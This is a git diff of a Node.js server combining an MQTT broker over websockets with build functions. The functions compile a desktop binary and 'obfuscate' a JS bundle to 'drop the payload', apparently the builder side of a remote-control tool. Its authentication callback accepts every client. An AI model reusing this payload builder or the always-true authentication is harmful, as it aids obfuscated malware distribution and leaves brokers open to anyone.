@@ -1,44 +1,23 @@
-const express = require('express')
-const { exec } = require('child_process')
+import * as express from 'express'
+import { exec } from 'child_process'
+import * as next from 'next'
+import * as ws from 'websocket-stream'
+import * as path from 'path'
+import * as pkg from 'pkg'
+import * as webpack from 'webpack'
+
+// Aedes init and import
 const aedes = require('aedes')()
-const next = require('next')
-const ws = require('websocket-stream')
-//const webpack = require('webpack')
-const path = require('path')
-const pkg = require('pkg')
-const compile = pkg.exec
-const aedesPersistenceRedis = require('aedes-persistence-redis')
 
-aedesPersistenceRedis({
-    port: 6379,
-    host: '127.0.0.1',
-    family: 4,
-    db: 0,
-    maxSessionDelivery: 100,
-    packetTTL: (packet) => 10
-})
 
-client.on("error", function(error) {
-    console.error(error)
-})
-
-// Admin class
-function Admin() {
-
-}
-Admin.prototype.isLogged = false
-Admin.prototype.Login = (username, password ) => {
-
+// Build desktop app with PKG
+async function BuildDesktopPayload() {
+    await pkg.exec([ 'builder/desktop/src/index.js', '--target', 'host', '--output', 'builder/desktop/build/bin/app' ])
 }
 
-async function BuildDesktopPayload(packet, cb) {
-    await compile([ 'builder/desktop/src/index.js', '--target', 'host', '--output', 'builder/desktop/build/bin/app' ])
-
-
-}
-
+// Bundle, transpile and obfuscate with webpack + loader then drop the payload
 async function BuildJSPayload() {
-/*     webpack({
+    webpack({
         entry: [
             'regenerator-runtime/runtime',
             './builder/desktop/src/index.js'
@@ -71,7 +50,7 @@ async function BuildJSPayload() {
         if(err || stats.hasErrors()) {
             console.log('error building')
         }
-    }) */
+    })
 
 }
 
@@ -161,6 +140,3 @@ setInterval(()=> {
 
 aedes.authenticate = (client, username, password, callback) => callback(null, true)
 
-
-
-// aedes.subscribe('buildexe', pkgBuildExe(packet, cb), done)
